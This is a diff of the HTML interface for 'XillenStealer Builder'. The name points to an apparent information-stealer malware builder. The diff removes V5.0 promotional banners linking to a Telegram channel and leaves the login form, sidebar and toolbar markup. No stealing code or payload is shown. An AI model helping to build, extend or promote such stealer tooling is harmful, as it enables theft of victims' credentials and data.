@@ -3,30 +3,15 @@
   <head>
     <meta charset="utf-8" />
     <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data: file:;" />
-    <title>XillenStealer Builder V5.0</title>
+    <title>XillenStealer Builder V4.0</title>
     <link rel="stylesheet" href="style.css" />
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
   </head>
   <body>
-    <!-- Назойливый баннер V5.0 - ВЕЗДЕ! -->
-    <div class="annoying-banner" id="annoyingBanner">
-      <a href="https://t.me/XillenStealer" target="_blank" class="banner-link">
-        <svg class="banner-icon" width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
-          <path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"/>
-        </svg>
-        <span class="banner-text">V5.0 - t.me/XillenStealer</span>
-        <svg class="banner-icon" width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
-          <path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"/>
-        </svg>
-        <span class="banner-pulse">Обновись до V5.0!</span>
-      </a>
-      <button class="banner-close" id="bannerClose" onclick="return false;">&times;</button>
-    </div>
-    
-    <!-- Дополнительный баннер в центре экрана -->
-    <div class="floating-banner" id="floatingBanner">
+    <!-- Всплывающий баннер (скрыт по умолчанию) -->
+    <div class="floating-banner" id="floatingBanner" style="display: none;">
       <div class="floating-content">
         <svg class="floating-icon" width="48" height="48" viewBox="0 0 24 24" fill="currentColor">
           <path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"/>
@@ -52,17 +37,6 @@
           <img src="assets/logo.png" alt="XillenStealer" class="auth-logo" />
           <h1 data-translate="auth.title">XillenStealer Builder</h1>
           <p data-translate="auth.version">v4.0</p>
-          <div style="margin-top: 15px; padding: 10px; background: rgba(255, 152, 0, 0.15); border-radius: 8px; border: 2px solid #ff9800;">
-            <a href="https://t.me/XillenStealer" target="_blank" style="color: #ff9800; font-weight: 900; text-decoration: none; font-size: 16px; display: flex; align-items: center; justify-content: center; gap: 8px;">
-              <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
-                <path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"/>
-              </svg>
-              V5.0 - t.me/XillenStealer
-              <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
-                <path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"/>
-              </svg>
-            </a>
-          </div>
         </div>
         <div class="auth-form">
           <h2 data-translate="auth.login">Аутентификация</h2>
@@ -100,16 +74,6 @@
       <div id="rainContainer" class="rain-container"></div>
       
       <div class="sidebar">
-        <!-- Баннер V5.0 в сайдбаре -->
-        <div class="sidebar-banner">
-          <a href="https://t.me/XillenStealer" target="_blank" class="sidebar-banner-link">
-            <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor" style="margin-bottom: 5px;">
-              <path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"/>
-            </svg>
-            <span class="sidebar-banner-text">V5.0 доступна!</span>
-            <span class="sidebar-banner-link-text">t.me/XillenStealer</span>
-          </a>
-        </div>
         <div class="brand">
           <img src="assets/logo.png" alt="Xillen" class="logo" />
         </div>
@@ -151,17 +115,6 @@
       <div class="content">
         <header class="topbar">
           <div class="title" data-translate="app.title">XillenStealer Builder V4.0</div>
-          <div class="topbar-v5-banner">
-            <a href="https://t.me/XillenStealer" target="_blank" class="topbar-v5-link">
-              <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor">
-                <path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"/>
-              </svg>
-              V5.0 - t.me/XillenStealer
-              <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor">
-                <path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"/>
-              </svg>
-            </a>
-          </div>
           <div class="topbar-actions">
             <button id="refreshBtn" class="btn" data-translate="topbar.refresh">Обновить</button>
             <button id="settingsBtn" class="btn" data-translate="topbar.settings">Настройки</button>
